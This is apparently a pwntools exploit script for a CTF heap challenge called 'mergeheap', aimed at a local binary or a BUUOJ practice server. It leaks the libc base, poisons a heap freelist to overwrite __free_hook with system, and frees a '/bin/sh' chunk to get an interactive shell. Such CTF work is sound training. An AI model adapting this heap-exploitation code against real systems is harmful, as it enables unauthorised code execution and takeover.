import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./mergeheap')
	elf=ELF('./mergeheap')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
else :
	io=remote('node3.buuoj.cn',28530)
	elf=ELF('./mergeheap')
	libc=ELF('../../x64libc/libc.so.6')

def add(a,b):
	io.sendlineafter('>>','1')
	io.sendlineafter(':',str(a))
	io.sendlineafter(':',b)

def show(a):
	io.sendlineafter('>>','2')
	io.sendlineafter(':',str(a))

def delete(a):
	io.sendlineafter('>>','3')
	io.sendlineafter(':',str(a))

def pin(a,b):
	io.sendlineafter('>>','4')
	io.sendlineafter(':',str(a))
	io.sendlineafter(':',str(b))
add(0xb8,'a'*0xb8)
add(0x50,'b'*0x4f+'\xf0')
add(0x128,'1')
add(0x50,'a')
add(0x60,'a')
add(0x20,'/bin/sh\x00')
for i in range(7):
	add(0x128,'aaaaaa')
for i in range(7):
	delete(i+6)

delete(2)
add(0x8,'aaaaaaaa')
show(2)
io.recv(8)
libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-368-0x10
success('libc_base:'+hex(libc_base))
pin(0,1)
delete(4)
delete(3)
add(0xe0,'a'*0x50+p64(0)+p64(0x71)+p64(libc_base+libc.sym['__free_hook']-0x10))
add(0x60,'a')
add(0x60,p64(libc_base+libc.sym['system']-16))
delete(5)





#gdb.attach(io)
#pause()
io.interactive()